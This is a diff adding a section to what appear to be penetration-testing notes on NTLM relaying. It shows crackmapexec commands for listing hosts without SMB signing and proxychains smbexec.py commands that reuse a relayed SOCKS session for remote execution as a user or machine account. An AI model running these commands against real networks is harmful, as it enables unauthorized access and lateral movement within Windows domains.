@@ -11,4 +11,8 @@
  - Targets (systems without SMB signing) can be gathered with:   
    `crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt`   
  
- 
+## Using the socks connection
+ - Once there is an authenticated socks connection (check with command "socks" in ntlmrelayx console), it can be used with proxychains:   
+   `proxychains smbexec.py 'DOMAIN/user:gugus@<target-ip>'`   
+ - If you relay a machine account:   
+   `proxychains smbexec.py 'DOMAIN/MACHINE$:gugus@<target-ip>'`   
